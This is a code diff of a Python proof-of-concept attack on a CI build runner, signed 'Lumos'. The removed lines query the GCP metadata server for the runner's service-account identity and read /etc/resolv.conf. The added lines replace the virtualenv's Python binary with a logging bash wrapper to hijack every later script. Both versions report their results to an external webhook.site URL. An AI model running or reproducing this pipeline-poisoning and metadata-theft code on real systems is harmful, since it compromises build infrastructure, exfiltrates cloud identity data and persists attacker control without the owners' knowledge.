@@ -1,29 +1,33 @@
+import os
 import subprocess
 import json
 
 WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"
 
-def exploit_metadata():
-    # Попытка достучаться до GCP Metadata Server (классика для Lateral Movement)
-    # Заголовок 'Metadata-Flavor: Google' обязателен для GCP
-    cmd = [
-        'curl', '-s', '-H', 'Metadata-Flavor: Google',
-        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email'
-    ]
+def poisoning_poc():
+    # Создаем фейковый бинарник, который логирует всё и запускает оригинал
+    fake_wrapper = """#!/bin/bash
+echo "[LUMOS_LOGGER] Command executed: $@" >> /tmp/spy.log
+# Здесь мог быть код, отправляющий все переменные окружения на вебхук
+/app/.venv/bin/python "$@"
+"""
     
     try:
-        service_account = subprocess.check_output(cmd, timeout=5).decode().strip()
-    except:
-        service_account = "ACCESS_DENIED_OR_TIMEOUT"
+        # Пытаемся подменить python в venv
+        target_path = "/app/.venv/bin/python"
+        os.rename(target_path, target_path + ".orig")
+        with open(target_path, "w") as f:
+            f.write(fake_wrapper)
+        os.chmod(target_path, 0o755)
+        status = "SUCCESS: Python binary hijacked. I now control every script in this build."
+    except Exception as e:
+        status = f"FAILED: {str(e)}"
 
-    # Проверка на наличие открытых портов в стандартной сети Kubernetes/Docker
-    # Мы попробуем найти DNS-сервер или API-сервер
     report = {
-        "CRITICAL_EXPOSURE": "CLOUD_SERVICE_ACCOUNT_LEAK",
-        "service_account": service_account,
-        "internal_dns_info": open("/etc/resolv.conf").read(),
-        "status": "I can identify the IAM identity of this runner. If I get the token, I own your cloud.",
-        "pwned_by": "Lumos"
+        "ATTACK_VECTOR": "BUILD_PIPELINE_POISONING",
+        "result": status,
+        "danger": "Every subsequent 'python' command will now run my code first.",
+        "note": "This is how Supply Chain attacks stay persistent in CI/CD."
     }
 
     subprocess.run([
@@ -34,4 +38,4 @@ def exploit_metadata():
     ])
 
 if __name__ == "__main__":
-    exploit_metadata()
+    poisoning_poc()
